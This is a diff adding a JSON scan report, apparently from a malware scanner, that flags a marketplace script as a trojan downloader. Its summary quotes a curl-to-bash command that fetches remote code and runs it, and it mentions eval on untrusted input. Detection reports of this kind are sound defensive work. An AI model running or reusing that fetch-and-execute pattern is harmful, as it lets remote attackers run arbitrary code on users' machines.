@@ -1,0 +1,50 @@
+{
+  "verdict": {
+    "label": "malicious",
+    "primary_concern": "trojan-downloader",
+    "issue_types": [
+      "trojan-downloader",
+      "active-malice"
+    ]
+  },
+  "top_findings": [
+    {
+      "id": "",
+      "cat": "trojan-downloader",
+      "class": "active-malice",
+      "severity": "",
+      "conf": "",
+      "summary": "Detected in `scripts/complex.sh`. The code contains clear Trojan Downloader patterns: Line 8 uses `curl http://api.com/data | jq '.script' | bash` to download arbitrary code from a remote server and execute it via bash pipe. This is a standard remote code execution vector. Additionally, lines 11-12 and 15-16 use `eval` on external input (from `config.txt` and from downloaded network data), which allows arbitrary command execution if the input is maliciously controlled. These patterns match known OpenClaw attack templates for downloading and executing malicious payloads.",
+      "impact": "",
+      "fix": "",
+      "decision_level": "MALICIOUS",
+      "primary_group": "Active Malice",
+      "scan_level": "Script Scan",
+      "risk_types": [
+        "Trojan Downloader"
+      ],
+      "source_platform": "Marketplace",
+      "source_file": "scan_results_script_Marketplace.csv",
+      "related_file_count": "1",
+      "flags": {
+        "external_server": false,
+        "api_key": false,
+        "autonomous_execution": false,
+        "browser_session_or_credentials": false,
+        "filesystem_access": false,
+        "shell_or_command_execution": true,
+        "driver_or_installer": false,
+        "credential_request": false,
+        "obfuscation_or_evasion": false,
+        "persistence_or_external_storage": false
+      },
+      "spans": []
+    }
+  ],
+  "coverage_audit": {
+    "adequate": true,
+    "missed": [],
+    "needs_rescan": false
+  },
+  "next_action": "stop"
+}
